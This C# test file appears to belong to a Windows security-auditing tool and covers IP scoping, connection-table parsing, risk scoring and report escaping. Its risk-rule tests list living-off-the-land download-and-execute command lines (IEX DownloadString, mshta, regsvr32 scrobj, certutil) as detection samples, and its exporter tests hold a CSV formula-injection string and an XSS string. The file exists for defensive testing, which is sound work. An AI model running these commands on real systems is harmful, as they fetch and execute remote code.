using System.Buffers.Binary;
using System.Net;
using Conexoes.Core.Collectors;
using Conexoes.Core.Models;
using Conexoes.Core.Net;
using Conexoes.Core.Reporting;
using Conexoes.Core.Security;

namespace Conexoes.Tests;

public class IpClassifierTests
{
    [Theory]
    [InlineData("127.0.0.1", IpScope.Loopback)]
    [InlineData("::1", IpScope.Loopback)]
    [InlineData("10.1.2.3", IpScope.Privado)]
    [InlineData("172.16.0.1", IpScope.Privado)]
    [InlineData("172.31.255.255", IpScope.Privado)]
    [InlineData("172.32.0.1", IpScope.Externo)]
    [InlineData("192.168.0.10", IpScope.Privado)]
    [InlineData("169.254.1.1", IpScope.Privado)]
    [InlineData("100.64.0.1", IpScope.Privado)]
    [InlineData("fe80::1", IpScope.Privado)]
    [InlineData("fd12:3456::1", IpScope.Privado)]
    [InlineData("224.0.0.251", IpScope.Multicast)]
    [InlineData("ff02::1", IpScope.Multicast)]
    [InlineData("8.8.8.8", IpScope.Externo)]
    [InlineData("2606:4700::1111", IpScope.Externo)]
    [InlineData("::ffff:192.168.1.1", IpScope.Privado)]
    [InlineData("::ffff:1.1.1.1", IpScope.Externo)]
    [InlineData("0.0.0.0", IpScope.Indefinido)]
    [InlineData("::", IpScope.Indefinido)]
    public void Classifies(string ip, IpScope expected) =>
        Assert.Equal(expected, IpClassifier.Classify(IPAddress.Parse(ip)));
}

public class IpHelperTablesTests
{
    [Theory]
    [InlineData(0x5000u, 80)]     // 80 = 0x0050 em network order -> bytes 00 50
    [InlineData(0xBB01u, 443)]    // 443 = 0x01BB
    [InlineData(0x3D0Du, 3389)]   // 3389 = 0x0D3D
    public void ConvertsNetworkPort(uint raw, int expected) =>
        Assert.Equal(expected, IpHelperTables.NetworkPortToHost(raw));

    [Fact]
    public void ParsesTcp4Rows()
    {
        var table = new byte[4 + 2 * IpHelperTables.Tcp4RowSize];
        BinaryPrimitives.WriteUInt32LittleEndian(table, 2);
        WriteRow(table, 4, state: 5, local: [192, 168, 0, 2], localPort: 50000, remote: [8, 8, 8, 8], remotePort: 443, pid: 1234);
        WriteRow(table, 4 + IpHelperTables.Tcp4RowSize, state: 2, local: [0, 0, 0, 0], localPort: 135, remote: [0, 0, 0, 0], remotePort: 0, pid: 900);

        var rows = IpHelperTables.ParseTcp4(table);

        Assert.Equal(2, rows.Count);
        Assert.Equal("ESTABLISHED", rows[0].State);
        Assert.Equal(IPAddress.Parse("192.168.0.2"), rows[0].LocalAddress);
        Assert.Equal(50000, rows[0].LocalPort);
        Assert.Equal(IPAddress.Parse("8.8.8.8"), rows[0].RemoteAddress);
        Assert.Equal(443, rows[0].RemotePort);
        Assert.Equal(1234, rows[0].Pid);

        Assert.Equal("LISTEN", rows[1].State);
        Assert.Null(rows[1].RemoteAddress);
        Assert.Equal(135, rows[1].LocalPort);
    }

    [Fact]
    public void IgnoresTruncatedTable()
    {
        var table = new byte[4 + IpHelperTables.Tcp4RowSize - 1];
        BinaryPrimitives.WriteUInt32LittleEndian(table, 1);
        Assert.Empty(IpHelperTables.ParseTcp4(table));
    }

    private static void WriteRow(byte[] t, int o, uint state, byte[] local, int localPort, byte[] remote, int remotePort, uint pid)
    {
        BinaryPrimitives.WriteUInt32LittleEndian(t.AsSpan(o), state);
        local.CopyTo(t, o + 4);
        t[o + 8] = (byte)(localPort >> 8); t[o + 9] = (byte)localPort;
        remote.CopyTo(t, o + 12);
        t[o + 16] = (byte)(remotePort >> 8); t[o + 17] = (byte)remotePort;
        BinaryPrimitives.WriteUInt32LittleEndian(t.AsSpan(o + 20), pid);
    }
}

public class CommandLineParserTests
{
    [Theory]
    [InlineData("\"C:\\Program Files\\App\\app.exe\" /silent", "C:\\Program Files\\App\\app.exe")]
    [InlineData("C:\\Windows\\system32\\svchost.exe -k netsvcs -p", "C:\\Windows\\system32\\svchost.exe")]
    [InlineData("C:\\Program Files\\Some App\\run.exe --x", "C:\\Program Files\\Some App\\run.exe")]
    [InlineData("C:\\tools\\a.cmd", "C:\\tools\\a.cmd")]
    public void ExtractsExecutable(string cmd, string expected) =>
        Assert.Equal(expected, CommandLineParser.ExtractExecutable(cmd, resolve: false), ignoreCase: true);

    [Fact]
    public void ResolvesBareNameFromSystemDirectory()
    {
        var exe = CommandLineParser.ExtractExecutable("cmd /c echo oi");
        Assert.Equal(Path.Combine(Environment.SystemDirectory, "cmd.exe"), exe, ignoreCase: true);
    }

    [Theory]
    [InlineData("C:\\Program Files\\My App\\svc.exe -run", true)]
    [InlineData("\"C:\\Program Files\\My App\\svc.exe\" -run", false)]
    [InlineData("C:\\Windows\\system32\\svchost.exe -k x", false)]
    public void DetectsUnquotedServicePath(string path, bool expected) =>
        Assert.Equal(expected, CommandLineParser.IsUnquotedPathWithSpaces(path));
}

public class RiskRulesTests
{
    [Theory]
    [InlineData(@"C:\Users\ana\AppData\Local\Temp\x.exe", RiskRules.PathKind.HighRisk)]
    [InlineData(@"C:\Users\ana\Downloads\setup.exe", RiskRules.PathKind.HighRisk)]
    [InlineData(@"C:\Users\Public\a.exe", RiskRules.PathKind.HighRisk)]
    [InlineData(@"C:\Windows\Temp\a.exe", RiskRules.PathKind.HighRisk)]
    [InlineData(@"C:\Users\ana\AppData\Local\Discord\app.exe", RiskRules.PathKind.UserProfile)]
    [InlineData(@"C:\Program Files\Google\Chrome\chrome.exe", RiskRules.PathKind.Normal)]
    [InlineData(null, RiskRules.PathKind.Normal)]
    public void ClassifiesPaths(string? path, RiskRules.PathKind expected) =>
        Assert.Equal(expected, RiskRules.ClassifyPath(path));

    [Theory]
    [InlineData("powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA", RiskLevel.Alto)]
    [InlineData("powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x')\"", RiskLevel.Alto)]
    [InlineData("C:\\Windows\\System32\\mshta.exe http://evil/a.hta", RiskLevel.Alto)]
    [InlineData("rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"", RiskLevel.Alto)]
    [InlineData("regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll", RiskLevel.Alto)]
    [InlineData("certutil -urlcache -f http://x/a.exe a.exe", RiskLevel.Alto)]
    [InlineData("powershell.exe -WindowStyle Hidden -File C:\\scripts\\backup.ps1", RiskLevel.Medio)]
    [InlineData("C:\\Windows\\system32\\svchost.exe -k netsvcs", RiskLevel.Nenhum)]
    [InlineData("\"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe\" /background", RiskLevel.Nenhum)]
    public void ScoresCommandLines(string cmd, RiskLevel expected)
    {
        var findings = RiskRules.ForCommandLine(cmd).ToList();
        var max = findings.Count == 0 ? RiskLevel.Nenhum : findings.Max(f => f.Level);
        Assert.Equal(expected, max);
    }

    [Fact]
    public void UnsignedTempProgramWithExternalConnectionIsHighRisk()
    {
        var c = MakeConnection("8.8.8.8", @"C:\Users\ana\AppData\Local\Temp\x.exe", SignatureStatus.NaoAssinado);
        c.AddRisks(RiskRules.ForConnection(c));
        Assert.Equal(RiskLevel.Alto, c.Risk);
    }

    [Fact]
    public void SignedProgramWithExternalConnectionHasNoRisk()
    {
        var c = MakeConnection("8.8.8.8", @"C:\Program Files\Google\Chrome\chrome.exe", SignatureStatus.Valida);
        c.AddRisks(RiskRules.ForConnection(c));
        Assert.Equal(RiskLevel.Nenhum, c.Risk);
    }

    [Fact]
    public void UnsignedProgramOnLanOnlyHasNoRisk()
    {
        var c = MakeConnection("192.168.0.5", @"C:\tools\x.exe", SignatureStatus.NaoAssinado);
        c.AddRisks(RiskRules.ForConnection(c));
        Assert.Equal(RiskLevel.Nenhum, c.Risk);
    }

    [Fact]
    public void GuestEnabledIsHighRisk()
    {
        var u = new UserAccountInfo { Name = "Convidado", Sid = "S-1-5-21-1-2-3-501", Enabled = true };
        u.AddRisks(RiskRules.ForUser(u));
        Assert.Equal(RiskLevel.Alto, u.Risk);
    }

    [Fact]
    public void RdpFromExternalIpIsHighRisk()
    {
        var s = new SessionInfo { Type = "RDP", User = "x", ClientAddress = "45.1.2.3" };
        Assert.Contains(RiskRules.ForSession(s), f => f.Level == RiskLevel.Alto);
    }

    private static ConnectionInfo MakeConnection(string remote, string path, SignatureStatus sig) => new()
    {
        Protocol = "TCP",
        LocalAddress = IPAddress.Parse("192.168.0.2"),
        LocalPort = 50000,
        RemoteAddress = IPAddress.Parse(remote),
        RemotePort = 443,
        Pid = 1000,
        Scope = IpClassifier.Classify(IPAddress.Parse(remote)),
        ProcessName = Path.GetFileName(path),
        ProcessPath = path,
        Signature = new SignatureInfo(sig, null),
    };
}

public class ExporterTests
{
    [Fact]
    public void CsvEscapesSeparatorsAndFormulas()
    {
        var csv = Exporters.ToCsv(new ReportTable("t", ["a", "b"], [["x;y", "=cmd|' /c calc'!A1"]]));
        Assert.Contains("\"x;y\"", csv);
        Assert.Contains("'=cmd", csv);
    }

    [Fact]
    public void HtmlEncodesContent()
    {
        var html = Exporters.ToHtml("Relatório", [new ReportTable("t", ["a"], [["<script>alert(1)</script>"]])]);
        Assert.DoesNotContain("<script>alert", html);
        Assert.Contains("&lt;script&gt;", html);
    }
}

/// <summary>Testes que leem o sistema real (somente leitura).</summary>
public class IntegrationTests
{
    [Fact]
    public void ConnectionTableHasRowsAndSystemPid()
    {
        var conns = ConnectionCollector.Collect();
        Assert.NotEmpty(conns);
        // PID 4 (System) escuta na porta 445/139 na maioria das máquinas Windows
        Assert.All(conns.Where(c => c.Pid == 4), c => Assert.Equal("System", c.ProcessName));
    }

    [Fact]
    public void WindowsBinaryIsSigned()
    {
        // notepad e cmd são assinados por catálogo ou embutido; ambos devem dar Válida
        var sig = SignatureVerifier.Verify(Path.Combine(Environment.SystemDirectory, "cmd.exe"));
        Assert.Equal(SignatureStatus.Valida, sig.Status);
        Assert.Contains("Microsoft", sig.Publisher ?? "");
    }

    [Fact]
    public void UnsignedFileIsDetected()
    {
        var tmp = Path.Combine(Path.GetTempPath(), $"conexoes-test-{Guid.NewGuid():N}.exe");
        File.WriteAllBytes(tmp, [0x4D, 0x5A, 0, 0]);
        try
        {
            Assert.NotEqual(SignatureStatus.Valida, SignatureVerifier.Verify(tmp).Status);
        }
        finally
        {
            File.Delete(tmp);
        }
    }

    [Fact]
    public void AdministratorsGroupHasMembers() => Assert.NotEmpty(AccountCollector.CollectAdministrators());

    [Fact]
    public void ProcessesIncludeCurrentProcess()
    {
        var procs = ProcessCollector.Collect(verifySignatures: false);
        Assert.Contains(procs, p => p.Pid == Environment.ProcessId);
    }

    [Fact]
    public void ScheduledTasksCanBeRead() => Assert.NotEmpty(ScheduledTaskCollector.Collect());

    [Fact]
    public void OtherCollectorsRun()
    {
        Assert.NotNull(SessionCollector.Collect());
        Assert.NotNull(StartupCollector.Collect());
        Assert.NotEmpty(ServiceAndShareCollector.CollectServices());
        Assert.NotNull(ServiceAndShareCollector.CollectShares());
        Assert.NotEmpty(AccountCollector.CollectUsers());
    }
}
